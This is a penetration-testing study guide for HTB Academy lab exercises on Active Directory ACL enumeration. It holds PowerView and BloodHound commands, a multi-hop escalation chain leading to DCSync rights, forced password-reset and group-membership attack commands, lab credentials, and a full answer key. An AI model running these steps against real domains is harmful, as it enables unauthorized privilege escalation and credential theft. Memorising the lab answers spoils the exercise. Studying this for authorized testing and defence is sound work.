# ACL Enumeration

## 📋 Overview

Access Control List (ACL) enumeration is a critical phase in Active Directory penetration testing that reveals privilege escalation paths through object permissions and rights. Understanding how to systematically enumerate and analyze ACLs enables attackers to discover complex attack chains from low-privilege users to domain administrative access. This section covers both manual PowerView techniques and automated BloodHound analysis for comprehensive ACL assessment.

## 🎯 Strategic Context

### 🔧 **ACL Fundamentals**
- **Access Control Entries (ACEs)**: Individual permission entries within ACLs
- **Security Identifiers (SIDs)**: Unique identifiers for security principals
- **Extended Rights**: Special permissions beyond standard read/write operations
- **Object Types**: Users, groups, computers, and domain objects with ACLs
- **Attack Chains**: Multi-hop privilege escalation through ACL exploitation

### ⚡ **ACL Attack Scenarios**
- **Targeted Enumeration**: Starting from controlled user accounts
- **Group Membership Manipulation**: Adding users to privileged groups
- **Password Reset Rights**: Force changing other users' passwords
- **GenericAll/GenericWrite**: Comprehensive control over target objects
- **DCSync Rights**: Domain replication permissions for credential extraction

---

## 🔧 PowerView ACL Enumeration

### 📊 **Basic ACL Discovery with Find-InterestingDomainAcl**
```powershell
# Import PowerView module
Import-Module .\PowerView.ps1

# Find interesting ACLs (WARNING: Massive output!)
Find-InterestingDomainAcl
```

**Example Output (Truncated):**
```powershell
PS C:\htb> Find-InterestingDomainAcl

ObjectDN                : DC=INLANEFREIGHT,DC=LOCAL
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : ExtendedRight
ObjectAceType           : ab721a53-1e2f-11d0-9819-00aa0040529b
AceFlags                : ContainerInherit
AceType                 : AccessAllowedObject
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-3842939050-3880317879-2865463114-5189
IdentityReferenceName   : Exchange Windows Permissions
IdentityReferenceDomain : INLANEFREIGHT.LOCAL
IdentityReferenceDN     : CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=INLANEFREIGHT,DC=LOCAL
IdentityReferenceClass  : group

# Output continues for hundreds/thousands of entries...
```

**⚠️ Problem with Basic Enumeration:**
- **Information Overload**: Returns massive amounts of data
- **Time Consumption**: Extremely inefficient during assessments
- **Analysis Paralysis**: Difficult to identify actionable attack paths
- **Context Missing**: Lacks focus on controlled users/assets

---

## 🎯 Targeted ACL Enumeration Strategy

### 📍 **Step 1: Convert Username to SID**
```powershell
# Convert target username to Security Identifier
$sid = Convert-NameToSid wley

# Verify SID conversion
Write-Host "User SID: $sid"
```

### 🔍 **Step 2: Basic Object ACL Search (Without GUID Resolution)**
```powershell
# Search for objects where our user has rights (RAW GUID format)
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

**Example Raw Output:**
```powershell
PS C:\htb> Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}

ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-1176
ActiveDirectoryRights  : ExtendedRight
ObjectAceFlags         : ObjectAceTypePresent
ObjectAceType          : 00299570-246d-11d0-a768-00aa006e0529  # ← Raw GUID (not human-readable)
InheritedObjectAceType : 00000000-0000-0000-0000-000000000000
BinaryLength           : 56
AceQualifier           : AccessAllowed
IsCallback             : False
OpaqueLength           : 0
AccessMask             : 256
SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1181
AceType                : AccessAllowedObject
AceFlags               : ContainerInherit
IsInherited            : False
InheritanceFlags       : ContainerInherit
PropagationFlags       : None
AuditFlags             : None
```

### 🔍 **Step 3: Manual GUID to Rights Mapping**
```powershell
# Method 1: Manual GUID lookup
$guid = "00299570-246d-11d0-a768-00aa006e0529"
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * | Select Name,DisplayName,DistinguishedName,rightsGuid | ? {$_.rightsGuid -eq $guid} | fl
```

**GUID Resolution Output:**
```powershell
PS C:\htb> $guid= "00299570-246d-11d0-a768-00aa006e0529"
PS C:\htb> Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl

Name              : User-Force-Change-Password
DisplayName       : Reset Password
DistinguishedName : CN=User-Force-Change-Password,CN=Extended-Rights,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL
rightsGuid        : 00299570-246d-11d0-a768-00aa006e0529
```

### ⚡ **Step 4: Automated GUID Resolution with -ResolveGUIDs**
```powershell
# Search with automatic GUID-to-name resolution (RECOMMENDED)
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

**Human-Readable Output:**
```powershell
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 

AceQualifier           : AccessAllowed
ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : User-Force-Change-Password  # ← Human-readable!
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-1176
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1181
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : ContainerInherit
InheritedObjectAceType : All
OpaqueLength           : 0
```

---

## 🔄 Alternative Native PowerShell Methods

### 📋 **Method 1: Using Get-Acl and Get-ADUser**
```powershell
# Step 1: Create list of all domain users
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt

# Step 2: Foreach loop to check ACLs for each user
foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {
    get-acl "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}
}
```

**Native PowerShell Output:**
```powershell
PS C:\htb> foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}

Path                  : Microsoft.ActiveDirectory.Management.dll\ActiveDirectory:://RootDSE/CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
InheritanceType       : All
ObjectType            : 00299570-246d-11d0-a768-00aa006e0529
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : ObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : INLANEFREIGHT\wley
IsInherited           : False
InheritanceFlags      : ContainerInherit
PropagationFlags      : None
```

**⚠️ Performance Note:**
- **Much Slower**: Takes significantly longer than PowerView
- **Resource Intensive**: High CPU/memory usage in large environments
- **Less Efficient**: Requires additional GUID resolution steps
- **Useful Backup**: When PowerView is blocked or unavailable

---

## 🔗 Multi-Hop Attack Path Discovery

### 📊 **Attack Chain Example: wley → damundsen → Help Desk Level 1 → Information Technology → adunn → DCSync**

#### **Step 1: Initial User (wley) Analysis**
```powershell
# Convert wley to SID and find controlled objects
$sid = Convert-NameToSid wley
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}

# Result: wley has User-Force-Change-Password over damundsen
```

#### **Step 2: Second Hop Analysis (damundsen)**
```powershell
# Convert damundsen to SID and find their rights
$sid2 = Convert-NameToSid damundsen
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose
```

**damundsen Rights Output:**
```powershell
PS C:\htb> $sid2 = Convert-NameToSid damundsen
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose

AceType               : AccessAllowed
ObjectDN              : CN=Help Desk Level 1,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ListChildren, ReadProperty, GenericWrite
OpaqueLength          : 0
ObjectSID             : S-1-5-21-3842939050-3880317879-2865463114-4022
InheritanceFlags      : ContainerInherit
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1176
AccessMask            : 131132
AuditFlags            : None
AceFlags              : ContainerInherit
AceQualifier          : AccessAllowed
```

**💡 Key Finding:** damundsen has **GenericWrite** over "Help Desk Level 1" group!

#### **Step 3: Group Nesting Analysis**
```powershell
# Check if Help Desk Level 1 is nested in other groups
Get-DomainGroup -Identity "Help Desk Level 1" | select memberof
```

**Group Nesting Output:**
```powershell
PS C:\htb> Get-DomainGroup -Identity "Help Desk Level 1" | select memberof

memberof                                                                      
--------                                                                      
CN=Information Technology,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
```

**💡 Discovery:** Help Desk Level 1 is nested in "Information Technology" group!

#### **Step 4: Information Technology Group Rights**
```powershell
# Check what rights Information Technology group has
$itgroupsid = Convert-NameToSid "Information Technology"
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose
```

**Information Technology Rights:**
```powershell
PS C:\htb> $itgroupsid = Convert-NameToSid "Information Technology"
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose

AceType               : AccessAllowed
ObjectDN              : CN=Angela Dunn,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : GenericAll
OpaqueLength          : 0
ObjectSID             : S-1-5-21-3842939050-3880317879-2865463114-1164
InheritanceFlags      : ContainerInherit
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-4016
AccessMask            : 983551
AuditFlags            : None
AceFlags              : ContainerInherit
AceQualifier          : AccessAllowed
```

**💡 Key Finding:** Information Technology group has **GenericAll** over adunn user!

#### **Step 5: Final Target Analysis (adunn)**
```powershell
# Check what rights adunn has
$adunnsid = Convert-NameToSid adunn
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose
```

**adunn Rights (DCSync Discovery):**
```powershell
PS C:\htb> $adunnsid = Convert-NameToSid adunn 
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose

AceQualifier           : AccessAllowed
ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes-In-Filtered-Set
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1164
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : ContainerInherit
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1164
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : ContainerInherit
InheritedObjectAceType : All
OpaqueLength           : 0
```

**💡 JACKPOT:** adunn has **DS-Replication-Get-Changes** and **DS-Replication-Get-Changes-In-Filtered-Set** → **DCSync Attack!**

---

## 🩸 BloodHound ACL Visualization

### 📊 **Attack Path Discovery with BloodHound**

#### **Step 1: Data Collection**
```bash
# Collect data with SharpHound or BloodHound.py
.\SharpHound.exe -c All --zipfilename ILFREIGHT

# Or from Linux
bloodhound-python -u forend -p Klmcargo2 -ns 172.16.5.5 -d inlanefreight.local -c all
```

#### **Step 2: Visual Analysis**
1. **Set Starting Node**: Search for and select `wley@INLANEFREIGHT.LOCAL`
2. **Node Info Tab**: Scroll to "Outbound Control Rights"
3. **First Degree Object Control**: Shows direct rights (ForceChangePassword → damundsen)
4. **Transitive Object Control**: Shows full attack path (16 total objects)

#### **Step 3: Interactive Attack Path**
```cypher
# BloodHound Cypher queries for attack paths
MATCH (u:User {name:"WLEY@INLANEFREIGHT.LOCAL"}), (t:User), p=shortestPath((u)-[*1..]->(t)) WHERE u <> t RETURN p

# Find DCSync-capable users
MATCH (u:User)-[:MemberOf*1..]->(:Group)-[:GetChanges|GetChangesAll]->(:Domain) RETURN u.name
```

### 🔍 **BloodHound Interface Features**

#### **Right-Click Help Menus:**
- **Attack Information**: Detailed exploitation techniques
- **Tool Commands**: Specific commands for each attack
- **OPSEC Considerations**: Stealth and detection avoidance
- **External References**: Links to additional resources

#### **Pre-Built Queries:**
- **Find Shortest Paths to Domain Admins**
- **Find Principals with DCSync Rights**
- **Users with Foreign Domain Group Membership**
- **Computers where Domain Users are Local Admin**

---

## 🎯 HTB Academy Lab Solutions

### 📝 **Lab Questions & Solutions**

#### 🔍 **Question 1: "What is the rights GUID for User-Force-Change-Password?"**

**Solution:**
```powershell
# Method 1: Manual GUID lookup
$guid = "00299570-246d-11d0-a768-00aa006e0529"
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * | Select Name,DisplayName,DistinguishedName,rightsGuid | ? {$_.rightsGuid -eq $guid} | fl

# Method 2: Search for User-Force-Change-Password
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {Name -like 'User-Force-Change-Password'} -Properties * | Select rightsGuid
```

**✅ Answer: `00299570-246d-11d0-a768-00aa006e0529`**

#### 🚩 **Question 2: "What flag can we use with PowerView to show us the ObjectAceType in a human-readable format during our enumeration?"**

**Solution:**
```powershell
# The flag that resolves GUIDs to human-readable names
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

**✅ Answer: `-ResolveGUIDs`**

#### 🔑 **Question 3: "What privileges does the user damundsen have over the Help Desk Level 1 group?"**

**Solution:**
```powershell
# Convert damundsen to SID and search for rights
$sid2 = Convert-NameToSid damundsen
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose

# Look for Help Desk Level 1 group in results
# ActiveDirectoryRights : ListChildren, ReadProperty, GenericWrite
```

**✅ Answer: `GenericWrite`**

#### 🎯 **Question 4: "Using the skills learned in this section, enumerate the ActiveDirectoryRights that the user forend has over the user dpayne (Dagmar Payne)."**

**Complete Lab Workflow:**
```bash
# Step 1: Connect to target machine via RDP
xfreerdp /v:10.129.149.107 /u:htb-student /p:Academy_student_AD!
# Click "OK" on Computer Access Policy prompt
# Close Server Manager
# Run PowerShell as Administrator
```

**Solution Process:**
```powershell
# Step 1: Navigate to tools directory and import PowerView
cd C:\Tools\
Import-Module .\PowerView.ps1

# Step 2: Convert forend to SID
$sid = Convert-NameToSid forend

# Step 3: Enumerate domain objects that forend has rights over
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

**Actual Lab Output:**
```powershell
PS C:\Tools> $sid = Convert-NameToSid forend
PS C:\Tools> Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}

ObjectDN              : CN=Dagmar Payne,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ObjectSID             : S-1-5-21-3842939050-3880317879-2865463114-1152
ActiveDirectoryRights : GenericAll
BinaryLength          : 36
AceQualifier          : AccessAllowed
IsCallback            : False
OpaqueLength          : 0
AccessMask            : 983551
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-5614
AceType               : AccessAllowed
AceFlags              : ContainerInherit
IsInherited           : False
InheritanceFlags      : ContainerInherit
PropagationFlags      : None
AuditFlags            : None
```

**✅ Answer: `GenericAll`**

#### 🏆 **Question 5: "What is the ObjectAceType of the first right that the forend user has over the GPO Management group? (two words in the format Word-Word)"**

**Complete Solution Process (using same RDP session):**
```powershell
# Step 1: SID already converted from previous question
# $sid = Convert-NameToSid forend (already done)

# Step 2: Search for forend rights over GPO Management group with GUID resolution
Get-DomainObjectAcl -ResolveGUIDs -Identity "GPO Management" | ? {$_.SecurityIdentifier -eq $sid}
```

**Actual Lab Output:**
```powershell
PS C:\Tools> Get-DomainObjectAcl -ResolveGUIDs -Identity "GPO Management" | ? {$_.SecurityIdentifier -eq $sid}

AceQualifier           : AccessAllowed
ObjectDN               : CN=GPO Management,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : Self
ObjectAceType          : Self-Membership
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-4046
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-5614
AccessMask             : 8
AuditFlags             : None
IsInherited            : False
AceFlags               : ContainerInherit
InheritedObjectAceType : All
OpaqueLength           : 0

<SNIP>
```

**Key Observation:** The first entry shows `ObjectAceType : Self-Membership`

**✅ Answer: `Self-Membership`**

### 📋 **HTB Academy Lab Summary**

**All Verified Answers:**
1. **Rights GUID for User-Force-Change-Password**: `00299570-246d-11d0-a768-00aa006e0529`
2. **PowerView flag for human-readable format**: `-ResolveGUIDs`
3. **damundsen privileges over Help Desk Level 1**: `GenericWrite`
4. **forend ActiveDirectoryRights over dpayne**: `GenericAll`
5. **forend ObjectAceType over GPO Management**: `Self-Membership`

**Key Lab Details:**
- **RDP Credentials**: `htb-student:Academy_student_AD!`
- **Target IP**: `10.129.149.107` (example)
- **Tools Directory**: `C:\Tools\`
- **PowerView Module**: Import with `Import-Module .\PowerView.ps1`
- **Core Technique**: `Convert-NameToSid` + `Get-DomainObjectACL`

**Attack Path Discovered:**
```
forend → [GenericAll] → dpayne (Dagmar Payne)
forend → [Self-Membership] → GPO Management group
```

---

## 🔧 Advanced ACL Enumeration Techniques

### 🎯 **Targeted Rights Enumeration**
```powershell
# Find users with specific rights
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.ObjectAceType -eq "User-Force-Change-Password"}

# Find GenericAll rights
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.ActiveDirectoryRights -match "GenericAll"}

# Find WriteProperty rights
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.ActiveDirectoryRights -match "WriteProperty"}

# Find Group Membership manipulation rights
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.ObjectAceType -match "Self-Membership"}
```

### 🔍 **Object-Specific ACL Analysis**
```powershell
# Analyze specific group ACLs
Get-DomainObjectACL -ResolveGUIDs -Identity "Domain Admins"

# Analyze specific user ACLs
Get-DomainObjectACL -ResolveGUIDs -Identity Administrator

# Analyze computer object ACLs
Get-DomainObjectACL -ResolveGUIDs -Identity "ACADEMY-EA-DC01$"

# Analyze GPO ACLs
Get-DomainGPO | Get-DomainObjectACL -ResolveGUIDs
```

### 📊 **ACL Statistics and Analysis**
```powershell
# Count rights by type
Get-DomainObjectACL -ResolveGUIDs -Identity * | Group-Object ObjectAceType | Sort-Object Count -Descending

# Find users with most rights
Get-DomainObjectACL -ResolveGUIDs -Identity * | Group-Object SecurityIdentifier | Sort-Object Count -Descending

# Analyze inheritance patterns
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.IsInherited -eq $false} | Group-Object ObjectAceType
```

---

## 🛠️ Common ACL Attack Patterns

### 🔑 **Password Reset Rights**
```powershell
# Find all Force-Change-Password rights
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.ObjectAceType -eq "User-Force-Change-Password"}

# Attack: Force password reset
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity damundsen -AccountPassword $UserPassword
```

### 👥 **Group Membership Manipulation**
```powershell
# Find Self-Membership rights
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.ObjectAceType -eq "Self-Membership"}

# Attack: Add user to group
Add-DomainGroupMember -Identity "Help Desk Level 1" -Members damundsen
```

### 🎯 **GenericAll Exploitation**
```powershell
# Find GenericAll rights
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.ActiveDirectoryRights -match "GenericAll"}

# Exploitation options:
# 1. Password reset
# 2. Add to groups  
# 3. Modify attributes
# 4. Enable/disable accounts
# 5. Set SPNs for Kerberoasting
```

### 🔄 **DCSync Rights Discovery**
```powershell
# Find DCSync-capable accounts
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.ObjectAceType -match "DS-Replication-Get-Changes"}

# Verify both required rights:
# - DS-Replication-Get-Changes
# - DS-Replication-Get-Changes-All (or In-Filtered-Set)
```

---

## 🎓 Key Learning Objectives

### ✅ **PowerView Mastery**
- **Targeted Enumeration**: Start from controlled users, not broad sweeps
- **SID Conversion**: `Convert-NameToSid` for efficient searches
- **GUID Resolution**: Always use `-ResolveGUIDs` for readable output
- **Object Filtering**: Use `SecurityIdentifier` filtering for precise results

### 🎯 **Attack Path Discovery**
- **Multi-Hop Thinking**: Each compromised user opens new attack vectors
- **Group Nesting**: Understand transitive group membership privileges
- **Rights Escalation**: Map from basic user to domain admin systematically
- **Documentation**: Track each hop in the attack chain

### 📊 **BloodHound Integration**
- **Visual Confirmation**: Use BloodHound to verify manual enumeration
- **Path Optimization**: Find shortest routes to high-value targets
- **Query Mastery**: Leverage pre-built and custom Cypher queries
- **Help Resources**: Utilize right-click help for attack techniques

### ⚠️ **Operational Considerations**
- **Time Management**: Avoid getting lost in massive ACL outputs
- **Target Prioritization**: Focus on privileged groups and admin accounts
- **Alternative Methods**: Have backup techniques when tools are blocked
- **Performance Impact**: Large environment enumeration can be resource-intensive

---

## ⚡ Quick Reference Commands

### 🔧 **Essential ACL Enumeration Workflow**
```powershell
# 1. Import PowerView
Import-Module .\PowerView.ps1

# 2. Convert controlled user to SID
$sid = Convert-NameToSid [USERNAME]

# 3. Find rights (with GUID resolution)
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}

# 4. Analyze target objects
Get-DomainObjectACL -ResolveGUIDs -Identity [TARGET_OBJECT]

# 5. Check group memberships
Get-DomainGroup -Identity [GROUP_NAME] | select memberof

# 6. Recursive enumeration for attack paths
# Repeat steps 2-5 for each discovered target
```

### 📊 **Common ACL Rights Reference**

| **Right Type** | **Capability** | **Attack Vector** |
|----------------|----------------|-------------------|
| **User-Force-Change-Password** | Reset user passwords | Password reset attack |
| **GenericAll** | Full control over object | Complete compromise |
| **GenericWrite** | Modify object properties | Group membership, attributes |
| **Self-Membership** | Add self to group | Privilege escalation |
| **DS-Replication-Get-Changes** | Domain replication | DCSync attack |
| **WriteProperty** | Modify specific properties | Targeted attribute changes |

---

## 🔑 Key Takeaways

### ✅ **ACL Enumeration Best Practices**
- **Start Targeted**: Begin with controlled users, not domain-wide sweeps
- **Use -ResolveGUIDs**: Always prefer human-readable output
- **Think Multi-Hop**: Each user compromise opens new attack vectors
- **Document Paths**: Track the full attack chain for reporting

### 🎯 **Strategic Enumeration**
- **User → Group → User Chains**: Most common privilege escalation pattern
- **Group Nesting**: Critical for transitive privilege inheritance
- **High-Value Targets**: Domain Admins, Exchange admins, service accounts
- **DCSync Rights**: Ultimate goal for credential extraction

### ⚠️ **Operational Insights**
- **Time Boxing**: Don't get lost in massive ACL outputs
- **Tool Redundancy**: Have PowerShell alternatives when PowerView fails
- **BloodHound Confirmation**: Visual validation of discovered paths
- **Performance Awareness**: Large enumeration can impact target systems

### 🚀 **Attack Chain Examples**
1. **wley** → [ForceChangePassword] → **damundsen** → [GenericWrite] → **Help Desk Level 1** → [MemberOf] → **Information Technology** → [GenericAll] → **adunn** → [DCSync] → **Domain Compromise**

2. **Low-privilege User** → [Self-Membership] → **Privileged Group** → [Group Rights] → **High-value Target** → [Administrative Access] → **Domain Control**

---

*ACL enumeration transforms scattered AD permissions into clear attack paths, revealing how seemingly innocuous user rights can escalate to complete domain compromise through systematic privilege chaining.* 